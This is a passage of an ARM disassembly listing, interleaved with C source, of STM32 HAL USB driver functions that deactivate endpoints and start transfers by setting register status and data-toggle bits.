        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80065c6:	687a      	ldr	r2, [r7, #4]
 80065c8:	683b      	ldr	r3, [r7, #0]
 80065ca:	781b      	ldrb	r3, [r3, #0]
 80065cc:	009b      	lsls	r3, r3, #2
 80065ce:	4413      	add	r3, r2
 80065d0:	881b      	ldrh	r3, [r3, #0]
 80065d2:	b29b      	uxth	r3, r3
 80065d4:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80065d8:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80065dc:	f8a7 3046 	strh.w	r3, [r7, #70]	; 0x46
 80065e0:	687a      	ldr	r2, [r7, #4]
 80065e2:	683b      	ldr	r3, [r7, #0]
 80065e4:	781b      	ldrb	r3, [r3, #0]
 80065e6:	009b      	lsls	r3, r3, #2
 80065e8:	441a      	add	r2, r3
 80065ea:	f8b7 3046 	ldrh.w	r3, [r7, #70]	; 0x46
 80065ee:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80065f2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80065f6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80065fa:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80065fe:	b29b      	uxth	r3, r3
 8006600:	8013      	strh	r3, [r2, #0]
      }

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006602:	687a      	ldr	r2, [r7, #4]
 8006604:	683b      	ldr	r3, [r7, #0]
 8006606:	781b      	ldrb	r3, [r3, #0]
 8006608:	009b      	lsls	r3, r3, #2
 800660a:	4413      	add	r3, r2
 800660c:	881b      	ldrh	r3, [r3, #0]
 800660e:	b29b      	uxth	r3, r3
 8006610:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006614:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006618:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 800661c:	687a      	ldr	r2, [r7, #4]
 800661e:	683b      	ldr	r3, [r7, #0]
 8006620:	781b      	ldrb	r3, [r3, #0]
 8006622:	009b      	lsls	r3, r3, #2
 8006624:	441a      	add	r2, r3
 8006626:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 800662a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800662e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006632:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006636:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800663a:	b29b      	uxth	r3, r3
 800663c:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return ret;
 800663e:	f897 306f 	ldrb.w	r3, [r7, #111]	; 0x6f
}
 8006642:	4618      	mov	r0, r3
 8006644:	3774      	adds	r7, #116	; 0x74
 8006646:	46bd      	mov	sp, r7
 8006648:	f85d 7b04 	ldr.w	r7, [sp], #4
 800664c:	4770      	bx	lr
 800664e:	bf00      	nop

08006650 <USB_DeactivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DeactivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8006650:	b480      	push	{r7}
 8006652:	b08d      	sub	sp, #52	; 0x34
 8006654:	af00      	add	r7, sp, #0
 8006656:	6078      	str	r0, [r7, #4]
 8006658:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 800665a:	683b      	ldr	r3, [r7, #0]
 800665c:	7b1b      	ldrb	r3, [r3, #12]
 800665e:	2b00      	cmp	r3, #0
 8006660:	f040 808e 	bne.w	8006780 <USB_DeactivateEndpoint+0x130>
  {
    if (ep->is_in != 0U)
 8006664:	683b      	ldr	r3, [r7, #0]
 8006666:	785b      	ldrb	r3, [r3, #1]
 8006668:	2b00      	cmp	r3, #0
 800666a:	d044      	beq.n	80066f6 <USB_DeactivateEndpoint+0xa6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 800666c:	687a      	ldr	r2, [r7, #4]
 800666e:	683b      	ldr	r3, [r7, #0]
 8006670:	781b      	ldrb	r3, [r3, #0]
 8006672:	009b      	lsls	r3, r3, #2
 8006674:	4413      	add	r3, r2
 8006676:	881b      	ldrh	r3, [r3, #0]
 8006678:	81bb      	strh	r3, [r7, #12]
 800667a:	89bb      	ldrh	r3, [r7, #12]
 800667c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006680:	2b00      	cmp	r3, #0
 8006682:	d01b      	beq.n	80066bc <USB_DeactivateEndpoint+0x6c>
 8006684:	687a      	ldr	r2, [r7, #4]
 8006686:	683b      	ldr	r3, [r7, #0]
 8006688:	781b      	ldrb	r3, [r3, #0]
 800668a:	009b      	lsls	r3, r3, #2
 800668c:	4413      	add	r3, r2
 800668e:	881b      	ldrh	r3, [r3, #0]
 8006690:	b29b      	uxth	r3, r3
 8006692:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006696:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800669a:	817b      	strh	r3, [r7, #10]
 800669c:	687a      	ldr	r2, [r7, #4]
 800669e:	683b      	ldr	r3, [r7, #0]
 80066a0:	781b      	ldrb	r3, [r3, #0]
 80066a2:	009b      	lsls	r3, r3, #2
 80066a4:	441a      	add	r2, r3
 80066a6:	897b      	ldrh	r3, [r7, #10]
 80066a8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80066ac:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80066b0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80066b4:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80066b8:	b29b      	uxth	r3, r3
 80066ba:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80066bc:	687a      	ldr	r2, [r7, #4]
 80066be:	683b      	ldr	r3, [r7, #0]
 80066c0:	781b      	ldrb	r3, [r3, #0]
 80066c2:	009b      	lsls	r3, r3, #2
 80066c4:	4413      	add	r3, r2
 80066c6:	881b      	ldrh	r3, [r3, #0]
 80066c8:	b29b      	uxth	r3, r3
 80066ca:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80066ce:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80066d2:	813b      	strh	r3, [r7, #8]
 80066d4:	687a      	ldr	r2, [r7, #4]
 80066d6:	683b      	ldr	r3, [r7, #0]
 80066d8:	781b      	ldrb	r3, [r3, #0]
 80066da:	009b      	lsls	r3, r3, #2
 80066dc:	441a      	add	r2, r3
 80066de:	893b      	ldrh	r3, [r7, #8]
 80066e0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80066e4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80066e8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80066ec:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80066f0:	b29b      	uxth	r3, r3
 80066f2:	8013      	strh	r3, [r2, #0]
 80066f4:	e192      	b.n	8006a1c <USB_DeactivateEndpoint+0x3cc>
    }

    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80066f6:	687a      	ldr	r2, [r7, #4]
 80066f8:	683b      	ldr	r3, [r7, #0]
 80066fa:	781b      	ldrb	r3, [r3, #0]
 80066fc:	009b      	lsls	r3, r3, #2
 80066fe:	4413      	add	r3, r2
 8006700:	881b      	ldrh	r3, [r3, #0]
 8006702:	827b      	strh	r3, [r7, #18]
 8006704:	8a7b      	ldrh	r3, [r7, #18]
 8006706:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800670a:	2b00      	cmp	r3, #0
 800670c:	d01b      	beq.n	8006746 <USB_DeactivateEndpoint+0xf6>
 800670e:	687a      	ldr	r2, [r7, #4]
 8006710:	683b      	ldr	r3, [r7, #0]
 8006712:	781b      	ldrb	r3, [r3, #0]
 8006714:	009b      	lsls	r3, r3, #2
 8006716:	4413      	add	r3, r2
 8006718:	881b      	ldrh	r3, [r3, #0]
 800671a:	b29b      	uxth	r3, r3
 800671c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006720:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006724:	823b      	strh	r3, [r7, #16]
 8006726:	687a      	ldr	r2, [r7, #4]
 8006728:	683b      	ldr	r3, [r7, #0]
 800672a:	781b      	ldrb	r3, [r3, #0]
 800672c:	009b      	lsls	r3, r3, #2
 800672e:	441a      	add	r2, r3
 8006730:	8a3b      	ldrh	r3, [r7, #16]
 8006732:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006736:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800673a:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800673e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006742:	b29b      	uxth	r3, r3
 8006744:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006746:	687a      	ldr	r2, [r7, #4]
 8006748:	683b      	ldr	r3, [r7, #0]
 800674a:	781b      	ldrb	r3, [r3, #0]
 800674c:	009b      	lsls	r3, r3, #2
 800674e:	4413      	add	r3, r2
 8006750:	881b      	ldrh	r3, [r3, #0]
 8006752:	b29b      	uxth	r3, r3
 8006754:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006758:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800675c:	81fb      	strh	r3, [r7, #14]
 800675e:	687a      	ldr	r2, [r7, #4]
 8006760:	683b      	ldr	r3, [r7, #0]
 8006762:	781b      	ldrb	r3, [r3, #0]
 8006764:	009b      	lsls	r3, r3, #2
 8006766:	441a      	add	r2, r3
 8006768:	89fb      	ldrh	r3, [r7, #14]
 800676a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800676e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006772:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006776:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800677a:	b29b      	uxth	r3, r3
 800677c:	8013      	strh	r3, [r2, #0]
 800677e:	e14d      	b.n	8006a1c <USB_DeactivateEndpoint+0x3cc>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->is_in == 0U)
 8006780:	683b      	ldr	r3, [r7, #0]
 8006782:	785b      	ldrb	r3, [r3, #1]
 8006784:	2b00      	cmp	r3, #0
 8006786:	f040 80a5 	bne.w	80068d4 <USB_DeactivateEndpoint+0x284>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 800678a:	687a      	ldr	r2, [r7, #4]
 800678c:	683b      	ldr	r3, [r7, #0]
 800678e:	781b      	ldrb	r3, [r3, #0]
 8006790:	009b      	lsls	r3, r3, #2
 8006792:	4413      	add	r3, r2
 8006794:	881b      	ldrh	r3, [r3, #0]
 8006796:	843b      	strh	r3, [r7, #32]
 8006798:	8c3b      	ldrh	r3, [r7, #32]
 800679a:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800679e:	2b00      	cmp	r3, #0
 80067a0:	d01b      	beq.n	80067da <USB_DeactivateEndpoint+0x18a>
 80067a2:	687a      	ldr	r2, [r7, #4]
 80067a4:	683b      	ldr	r3, [r7, #0]
 80067a6:	781b      	ldrb	r3, [r3, #0]
 80067a8:	009b      	lsls	r3, r3, #2
 80067aa:	4413      	add	r3, r2
 80067ac:	881b      	ldrh	r3, [r3, #0]
 80067ae:	b29b      	uxth	r3, r3
 80067b0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80067b4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80067b8:	83fb      	strh	r3, [r7, #30]
 80067ba:	687a      	ldr	r2, [r7, #4]
 80067bc:	683b      	ldr	r3, [r7, #0]
 80067be:	781b      	ldrb	r3, [r3, #0]
 80067c0:	009b      	lsls	r3, r3, #2
 80067c2:	441a      	add	r2, r3
 80067c4:	8bfb      	ldrh	r3, [r7, #30]
 80067c6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80067ca:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80067ce:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80067d2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80067d6:	b29b      	uxth	r3, r3
 80067d8:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80067da:	687a      	ldr	r2, [r7, #4]
 80067dc:	683b      	ldr	r3, [r7, #0]
 80067de:	781b      	ldrb	r3, [r3, #0]
 80067e0:	009b      	lsls	r3, r3, #2
 80067e2:	4413      	add	r3, r2
 80067e4:	881b      	ldrh	r3, [r3, #0]
 80067e6:	83bb      	strh	r3, [r7, #28]
 80067e8:	8bbb      	ldrh	r3, [r7, #28]
 80067ea:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80067ee:	2b00      	cmp	r3, #0
 80067f0:	d01b      	beq.n	800682a <USB_DeactivateEndpoint+0x1da>
 80067f2:	687a      	ldr	r2, [r7, #4]
 80067f4:	683b      	ldr	r3, [r7, #0]
 80067f6:	781b      	ldrb	r3, [r3, #0]
 80067f8:	009b      	lsls	r3, r3, #2
 80067fa:	4413      	add	r3, r2
 80067fc:	881b      	ldrh	r3, [r3, #0]
 80067fe:	b29b      	uxth	r3, r3
 8006800:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006804:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006808:	837b      	strh	r3, [r7, #26]
 800680a:	687a      	ldr	r2, [r7, #4]
 800680c:	683b      	ldr	r3, [r7, #0]
 800680e:	781b      	ldrb	r3, [r3, #0]
 8006810:	009b      	lsls	r3, r3, #2
 8006812:	441a      	add	r2, r3
 8006814:	8b7b      	ldrh	r3, [r7, #26]
 8006816:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800681a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800681e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006822:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006826:	b29b      	uxth	r3, r3
 8006828:	8013      	strh	r3, [r2, #0]

      /* Reset value of the data toggle bits for the endpoint out*/
      PCD_TX_DTOG(USBx, ep->num);
 800682a:	687a      	ldr	r2, [r7, #4]
 800682c:	683b      	ldr	r3, [r7, #0]
 800682e:	781b      	ldrb	r3, [r3, #0]
 8006830:	009b      	lsls	r3, r3, #2
 8006832:	4413      	add	r3, r2
 8006834:	881b      	ldrh	r3, [r3, #0]
 8006836:	b29b      	uxth	r3, r3
 8006838:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800683c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006840:	833b      	strh	r3, [r7, #24]
 8006842:	687a      	ldr	r2, [r7, #4]
 8006844:	683b      	ldr	r3, [r7, #0]
 8006846:	781b      	ldrb	r3, [r3, #0]
 8006848:	009b      	lsls	r3, r3, #2
 800684a:	441a      	add	r2, r3
 800684c:	8b3b      	ldrh	r3, [r7, #24]
 800684e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006852:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006856:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800685a:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800685e:	b29b      	uxth	r3, r3
 8006860:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006862:	687a      	ldr	r2, [r7, #4]
 8006864:	683b      	ldr	r3, [r7, #0]
 8006866:	781b      	ldrb	r3, [r3, #0]
 8006868:	009b      	lsls	r3, r3, #2
 800686a:	4413      	add	r3, r2
 800686c:	881b      	ldrh	r3, [r3, #0]
 800686e:	b29b      	uxth	r3, r3
 8006870:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006874:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006878:	82fb      	strh	r3, [r7, #22]
 800687a:	687a      	ldr	r2, [r7, #4]
 800687c:	683b      	ldr	r3, [r7, #0]
 800687e:	781b      	ldrb	r3, [r3, #0]
 8006880:	009b      	lsls	r3, r3, #2
 8006882:	441a      	add	r2, r3
 8006884:	8afb      	ldrh	r3, [r7, #22]
 8006886:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800688a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800688e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006892:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006896:	b29b      	uxth	r3, r3
 8006898:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800689a:	687a      	ldr	r2, [r7, #4]
 800689c:	683b      	ldr	r3, [r7, #0]
 800689e:	781b      	ldrb	r3, [r3, #0]
 80068a0:	009b      	lsls	r3, r3, #2
 80068a2:	4413      	add	r3, r2
 80068a4:	881b      	ldrh	r3, [r3, #0]
 80068a6:	b29b      	uxth	r3, r3
 80068a8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80068ac:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80068b0:	82bb      	strh	r3, [r7, #20]
 80068b2:	687a      	ldr	r2, [r7, #4]
 80068b4:	683b      	ldr	r3, [r7, #0]
 80068b6:	781b      	ldrb	r3, [r3, #0]
 80068b8:	009b      	lsls	r3, r3, #2
 80068ba:	441a      	add	r2, r3
 80068bc:	8abb      	ldrh	r3, [r7, #20]
 80068be:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80068c2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80068c6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80068ca:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80068ce:	b29b      	uxth	r3, r3
 80068d0:	8013      	strh	r3, [r2, #0]
 80068d2:	e0a3      	b.n	8006a1c <USB_DeactivateEndpoint+0x3cc>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80068d4:	687a      	ldr	r2, [r7, #4]
 80068d6:	683b      	ldr	r3, [r7, #0]
 80068d8:	781b      	ldrb	r3, [r3, #0]
 80068da:	009b      	lsls	r3, r3, #2
 80068dc:	4413      	add	r3, r2
 80068de:	881b      	ldrh	r3, [r3, #0]
 80068e0:	85fb      	strh	r3, [r7, #46]	; 0x2e
 80068e2:	8dfb      	ldrh	r3, [r7, #46]	; 0x2e
 80068e4:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80068e8:	2b00      	cmp	r3, #0
 80068ea:	d01b      	beq.n	8006924 <USB_DeactivateEndpoint+0x2d4>
 80068ec:	687a      	ldr	r2, [r7, #4]
 80068ee:	683b      	ldr	r3, [r7, #0]
 80068f0:	781b      	ldrb	r3, [r3, #0]
 80068f2:	009b      	lsls	r3, r3, #2
 80068f4:	4413      	add	r3, r2
 80068f6:	881b      	ldrh	r3, [r3, #0]
 80068f8:	b29b      	uxth	r3, r3
 80068fa:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80068fe:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006902:	85bb      	strh	r3, [r7, #44]	; 0x2c
 8006904:	687a      	ldr	r2, [r7, #4]
 8006906:	683b      	ldr	r3, [r7, #0]
 8006908:	781b      	ldrb	r3, [r3, #0]
 800690a:	009b      	lsls	r3, r3, #2
 800690c:	441a      	add	r2, r3
 800690e:	8dbb      	ldrh	r3, [r7, #44]	; 0x2c
 8006910:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006914:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006918:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800691c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006920:	b29b      	uxth	r3, r3
 8006922:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006924:	687a      	ldr	r2, [r7, #4]
 8006926:	683b      	ldr	r3, [r7, #0]
 8006928:	781b      	ldrb	r3, [r3, #0]
 800692a:	009b      	lsls	r3, r3, #2
 800692c:	4413      	add	r3, r2
 800692e:	881b      	ldrh	r3, [r3, #0]
 8006930:	857b      	strh	r3, [r7, #42]	; 0x2a
 8006932:	8d7b      	ldrh	r3, [r7, #42]	; 0x2a
 8006934:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006938:	2b00      	cmp	r3, #0
 800693a:	d01b      	beq.n	8006974 <USB_DeactivateEndpoint+0x324>
 800693c:	687a      	ldr	r2, [r7, #4]
 800693e:	683b      	ldr	r3, [r7, #0]
 8006940:	781b      	ldrb	r3, [r3, #0]
 8006942:	009b      	lsls	r3, r3, #2
 8006944:	4413      	add	r3, r2
 8006946:	881b      	ldrh	r3, [r3, #0]
 8006948:	b29b      	uxth	r3, r3
 800694a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800694e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006952:	853b      	strh	r3, [r7, #40]	; 0x28
 8006954:	687a      	ldr	r2, [r7, #4]
 8006956:	683b      	ldr	r3, [r7, #0]
 8006958:	781b      	ldrb	r3, [r3, #0]
 800695a:	009b      	lsls	r3, r3, #2
 800695c:	441a      	add	r2, r3
 800695e:	8d3b      	ldrh	r3, [r7, #40]	; 0x28
 8006960:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006964:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006968:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800696c:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006970:	b29b      	uxth	r3, r3
 8006972:	8013      	strh	r3, [r2, #0]
      PCD_RX_DTOG(USBx, ep->num);
 8006974:	687a      	ldr	r2, [r7, #4]
 8006976:	683b      	ldr	r3, [r7, #0]
 8006978:	781b      	ldrb	r3, [r3, #0]
 800697a:	009b      	lsls	r3, r3, #2
 800697c:	4413      	add	r3, r2
 800697e:	881b      	ldrh	r3, [r3, #0]
 8006980:	b29b      	uxth	r3, r3
 8006982:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006986:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800698a:	84fb      	strh	r3, [r7, #38]	; 0x26
 800698c:	687a      	ldr	r2, [r7, #4]
 800698e:	683b      	ldr	r3, [r7, #0]
 8006990:	781b      	ldrb	r3, [r3, #0]
 8006992:	009b      	lsls	r3, r3, #2
 8006994:	441a      	add	r2, r3
 8006996:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 8006998:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800699c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80069a0:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80069a4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80069a8:	b29b      	uxth	r3, r3
 80069aa:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint*/
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80069ac:	687a      	ldr	r2, [r7, #4]
 80069ae:	683b      	ldr	r3, [r7, #0]
 80069b0:	781b      	ldrb	r3, [r3, #0]
 80069b2:	009b      	lsls	r3, r3, #2
 80069b4:	4413      	add	r3, r2
 80069b6:	881b      	ldrh	r3, [r3, #0]
 80069b8:	b29b      	uxth	r3, r3
 80069ba:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80069be:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80069c2:	84bb      	strh	r3, [r7, #36]	; 0x24
 80069c4:	687a      	ldr	r2, [r7, #4]
 80069c6:	683b      	ldr	r3, [r7, #0]
 80069c8:	781b      	ldrb	r3, [r3, #0]
 80069ca:	009b      	lsls	r3, r3, #2
 80069cc:	441a      	add	r2, r3
 80069ce:	8cbb      	ldrh	r3, [r7, #36]	; 0x24
 80069d0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80069d4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80069d8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80069dc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80069e0:	b29b      	uxth	r3, r3
 80069e2:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 80069e4:	687a      	ldr	r2, [r7, #4]
 80069e6:	683b      	ldr	r3, [r7, #0]
 80069e8:	781b      	ldrb	r3, [r3, #0]
 80069ea:	009b      	lsls	r3, r3, #2
 80069ec:	4413      	add	r3, r2
 80069ee:	881b      	ldrh	r3, [r3, #0]
 80069f0:	b29b      	uxth	r3, r3
 80069f2:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80069f6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80069fa:	847b      	strh	r3, [r7, #34]	; 0x22
 80069fc:	687a      	ldr	r2, [r7, #4]
 80069fe:	683b      	ldr	r3, [r7, #0]
 8006a00:	781b      	ldrb	r3, [r3, #0]
 8006a02:	009b      	lsls	r3, r3, #2
 8006a04:	441a      	add	r2, r3
 8006a06:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 8006a08:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006a0c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a10:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006a14:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006a18:	b29b      	uxth	r3, r3
 8006a1a:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 8006a1c:	2300      	movs	r3, #0
}
 8006a1e:	4618      	mov	r0, r3
 8006a20:	3734      	adds	r7, #52	; 0x34
 8006a22:	46bd      	mov	sp, r7
 8006a24:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006a28:	4770      	bx	lr

08006a2a <USB_EPStartXfer>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPStartXfer(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8006a2a:	b580      	push	{r7, lr}
 8006a2c:	b0c2      	sub	sp, #264	; 0x108
 8006a2e:	af00      	add	r7, sp, #0
 8006a30:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a34:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006a38:	6018      	str	r0, [r3, #0]
 8006a3a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a3e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a42:	6019      	str	r1, [r3, #0]
  uint16_t pmabuffer;
  uint16_t wEPVal;
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  /* IN endpoint */
  if (ep->is_in == 1U)
 8006a44:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a48:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a4c:	681b      	ldr	r3, [r3, #0]
 8006a4e:	785b      	ldrb	r3, [r3, #1]
 8006a50:	2b01      	cmp	r3, #1
 8006a52:	f040 86b7 	bne.w	80077c4 <USB_EPStartXfer+0xd9a>
  {
    /*Multi packet transfer*/
    if (ep->xfer_len > ep->maxpacket)
 8006a56:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a5a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a5e:	681b      	ldr	r3, [r3, #0]
 8006a60:	699a      	ldr	r2, [r3, #24]
 8006a62:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a66:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a6a:	681b      	ldr	r3, [r3, #0]
 8006a6c:	691b      	ldr	r3, [r3, #16]
 8006a6e:	429a      	cmp	r2, r3
 8006a70:	d908      	bls.n	8006a84 <USB_EPStartXfer+0x5a>
    {
      len = ep->maxpacket;
 8006a72:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a76:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a7a:	681b      	ldr	r3, [r3, #0]
 8006a7c:	691b      	ldr	r3, [r3, #16]
 8006a7e:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
 8006a82:	e007      	b.n	8006a94 <USB_EPStartXfer+0x6a>
    }
    else
    {
      len = ep->xfer_len;
 8006a84:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a88:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a8c:	681b      	ldr	r3, [r3, #0]
 8006a8e:	699b      	ldr	r3, [r3, #24]
 8006a90:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
    }

    /* configure and validate Tx endpoint */
    if (ep->doublebuffer == 0U)
 8006a94:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a98:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a9c:	681b      	ldr	r3, [r3, #0]
